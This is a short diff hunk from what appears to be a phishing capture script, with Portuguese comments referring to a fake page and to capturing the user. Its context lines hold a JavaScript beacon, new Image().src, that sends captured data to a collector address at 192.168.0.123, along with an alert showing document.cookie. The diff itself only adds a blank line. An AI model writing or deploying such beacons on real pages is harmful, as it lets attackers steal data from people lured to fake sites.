@@ -20,6 +20,7 @@ new Image().src = "http://192.168.0.123/?=" + str2 +"_Recebeu_a_pagina_falsa_agu
 
 alert(document.cookie);
 
+
 // Para Testes
 //alert(str2);
 //alert('captura usuario / editar arquivo captura_usuario.js')
